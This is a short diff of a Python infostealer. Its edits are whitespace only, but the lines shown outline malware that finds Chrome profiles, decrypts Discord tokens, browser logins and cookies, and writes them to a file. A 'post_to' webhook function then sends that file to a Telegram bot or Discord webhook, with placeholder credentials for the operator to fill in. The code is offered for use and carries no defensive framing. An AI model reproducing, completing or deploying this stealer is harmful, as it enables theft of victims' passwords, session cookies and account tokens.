@@ -39,8 +39,6 @@ fileInfo = "info_" + os.getlogin() + ".txt"
 for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
     if i.startswith("Profile "):
         browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"
-
-
 # DISCORD TOKENS
 def decrypt_token(buff, master_key):
     try:
@@ -179,6 +177,7 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
             f.write(f"{name} Local State file missing\n")
 
 
+
 # PATH SHIT
 def Local_State(path):
     return f"{path}\\User Data\\Local State"
@@ -223,7 +222,7 @@ def decrypt_files(path, browser):
 
 # WEBHOOK
 def post_to(file):
-    token = "TELEGRAM TOKEN"  # put your token in here, if you don't wanna use telegram leave it like it is
+    token = "TELEGRAM TOKEN"     # put your token in here, if you don't wanna use telegram leave it like it is
     chat_id = "TELEGRAM CHATID"  # "    chatid          "                     telegram      "
     webhook_url = "WEBHOOK URL"  # "    webhook         "                     discord       "
     # if you don't understand it you shouldn't use it
